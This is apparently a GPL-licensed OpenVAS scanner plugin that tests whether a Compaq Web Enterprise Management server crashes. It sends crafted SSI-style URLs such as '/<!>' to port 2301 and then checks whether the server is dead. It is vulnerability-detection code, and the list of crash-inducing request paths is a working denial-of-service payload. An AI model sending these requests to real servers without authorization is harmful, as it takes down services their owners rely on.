# SPDX-FileCopyrightText: 2004 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11980");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_name("Compaq Web SSI DoS");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2004 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 2301);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"contact your vendor for a patch,
  or disable this service if you do not use it.");

  script_tag(name:"summary", value:"It was possible to kill the remote web server by requesting
  something like: /<!>

  This is probably a Compaq Web Enterprise Management server.");

  script_tag(name:"impact", value:"An attacker might use this flaw to forbid you from managing your machines.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");
include("misc_func.inc");

port = http_get_port(default:2301); # Also on 2381 - HTTPS
if(http_is_dead(port:port))
  exit(0);

# Just in case they just fix the first problem...
foreach url(make_list("/<!>", "/<!.StringRedirecturl>", "/<!.StringHttpRequest=Url>", "/<!.ObjectIsapiECB>", "/<!.StringIsapiECB=lpszPathInfo>")) {

  s = http_open_socket(port);
  if(!s)
    continue;

  r = http_get(port:port, item:url);
  send(socket:s, data:r);
  http_recv(socket:s);
  http_close_socket(s);
}

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);
